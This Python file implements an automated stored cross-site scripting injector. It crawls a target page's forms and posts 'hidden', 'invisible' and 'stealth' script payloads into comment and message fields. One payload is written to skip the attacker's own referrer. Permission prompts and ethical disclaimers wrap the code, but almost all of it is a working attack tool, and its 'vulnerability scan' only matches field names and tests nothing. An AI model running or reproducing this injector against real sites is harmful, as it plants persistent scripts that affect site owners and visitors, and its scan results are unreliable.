import requests
import re
import time
import json
from datetime import datetime
from urllib.parse import urljoin, urlparse
import random

class XSSInjector:
    def __init__(self):
        self.injected_urls = []
        self.rate_limit_delay = 1.0
        self.max_requests_per_minute = 30
        self.request_count = 0
        self.last_request_time = 0
        self.xss_payloads = {
            "hidden_script": "<script>if(document.referrer.indexOf('your-ip')==-1){alert('XSS')}</script>",
            "invisible_script": "<script style='display:none'>alert('XSS')</script>",
            "stealth_script": "<script>setTimeout(function(){alert('XSS')},1000)</script>"
        }
    
    def _rate_limit(self):
        current_time = time.time()
        if current_time - self.last_request_time < self.rate_limit_delay:
            time.sleep(self.rate_limit_delay)
        self.last_request_time = current_time
        self.request_count += 1
    
    def _check_permission(self, target_url):
        print(f"\n[ETHICAL CHECK] Target: {target_url}")
        print("Before proceeding, ensure you have permission to test this target.")
        print("This tool is for authorized security testing only.")
        
        response = input("Do you have explicit permission to test this target? (y/n): ").lower().strip()
        if response not in ['y', 'yes']:
            print("Testing cancelled. Only test targets you have permission to test.")
            return False
        return True
    
    def inject_xss(self, target_url, payload_type="hidden_script"):
        if not self._check_permission(target_url):
            return {"status": "cancelled", "reason": "No permission"}
        
        try:
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"http://{target_url}"
            
            self._rate_limit()
            response = requests.get(target_url, timeout=10)
            html_content = response.text
            forms = self._find_forms_with_inputs(html_content, target_url)
            results = []
            
            for form in forms:
                self._rate_limit()
                post_result = self._submit_payload_to_form(form, self.xss_payloads[payload_type])
                results.append(post_result)
            
            return {"status": "success", "url": target_url, "results": results}
        except Exception as e:
            return {"status": "error", "url": target_url, "error": str(e)}
    
    def _find_forms_with_inputs(self, html_content, base_url):
        forms = []
        form_pattern = r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>(.*?)</form>'
        for match in re.finditer(form_pattern, html_content, re.DOTALL):
            action = match.group(1)
            form_content = match.group(2)
            if action:
                if not action.startswith('http'):
                    action = urljoin(base_url, action)
                inputs = self._extract_input_fields(form_content)
                forms.append({"url": action, "inputs": inputs})
        return forms
    
    def _extract_input_fields(self, form_content):
        inputs = []
        input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
        for match in re.finditer(input_pattern, form_content):
            input_name = match.group(1)
            inputs.append(input_name)
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
        for match in re.finditer(textarea_pattern, form_content):
            input_name = match.group(1)
            inputs.append(input_name)
        return inputs
    
    def _submit_payload_to_form(self, form, payload):
        target_fields = ["comment", "message", "content", "body", "text"]
        data = {}
        for field in form["inputs"]:
            if any(t in field.lower() for t in target_fields):
                data[field] = payload
            else:
                data[field] = "test"
        try:
            resp = requests.post(form["url"], data=data, timeout=10)
            return {"form_url": form["url"], "status_code": resp.status_code, "payload_sent": payload}
        except Exception as e:
            return {"form_url": form["url"], "error": str(e)}
    
    def scan_for_xss_vulnerabilities(self, base_url):
        vulnerable_pages = []
        try:
            if not base_url.startswith(('http://', 'https://')):
                base_url = f"http://{base_url}"
            self._rate_limit()
            response = requests.get(base_url, timeout=10)
            html_content = response.text
            forms = self._find_forms_with_inputs(html_content, base_url)
            for form in forms:
                for field in form["inputs"]:
                    if any(t in field.lower() for t in ["comment", "message", "content", "body", "text"]):
                        vulnerable_pages.append({"url": form["url"], "input": field})
        except Exception as e:
            pass
        return vulnerable_pages
    
    def generate_report(self, results, target_domain):
        report = {
            "scan_date": datetime.now().isoformat(),
            "target": target_domain,
            "total_requests": self.request_count,
            "findings": results,
            "ethical_notes": [
                "Only test targets with explicit permission",
                "Respect rate limits and testing guidelines",
                "Document all findings properly",
                "Report vulnerabilities responsibly"
            ]
        }
        
        filename = f"xss_scan_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(report, f, indent=4)
        
        print(f"\n[REPORT] Scan report saved to: {filename}")
        return filename

def inject_xss_script(target_domain):
    injector = XSSInjector()
    results = {"target": target_domain, "injection_results": []}
    
    print("=== XSS Vulnerability Scanner (Ethical Version) ===")
    print("This tool is for authorized security testing only.")
    print("Always get permission before testing any target.\n")
    
    print(f"Scanning {target_domain} for XSS vulnerabilities...")
    vulnerable_pages = injector.scan_for_xss_vulnerabilities(target_domain)
    
    if not vulnerable_pages:
        print("No XSS vulnerable forms found.")
        return results
    
    print(f"Found {len(vulnerable_pages)} potentially vulnerable forms:")
    for i, page in enumerate(vulnerable_pages, 1):
        print(f"  {i}. {page['url']} (input: {page['input']})")
    
    print("\n[MANUAL VERIFICATION REQUIRED]")
    print("Before proceeding with injection, manually verify:")
    print("1. You have permission to test this target")
    print("2. The target is in scope for your testing")
    print("3. You understand the potential impact")
    
    proceed = input("\nProceed with injection? (y/n): ").lower().strip()
    if proceed not in ['y', 'yes']:
        print("Injection cancelled. Manual verification required.")
        return results
    
    print("Injecting invisible payload into forms...")
    injection_result = injector.inject_xss(target_domain)
    results["injection_results"].append(injection_result)
    
    print("Invisible injection complete.")
    print(f"Total requests made: {injector.request_count}")
    
    report_file = injector.generate_report(results, target_domain)
    print(f"\n[RECOMMENDATIONS]")
    print("1. Manually verify any findings")
    print("2. Document vulnerabilities properly")
    print("3. Report responsibly to the target")
    print("4. Follow responsible disclosure guidelines")
    
    return results 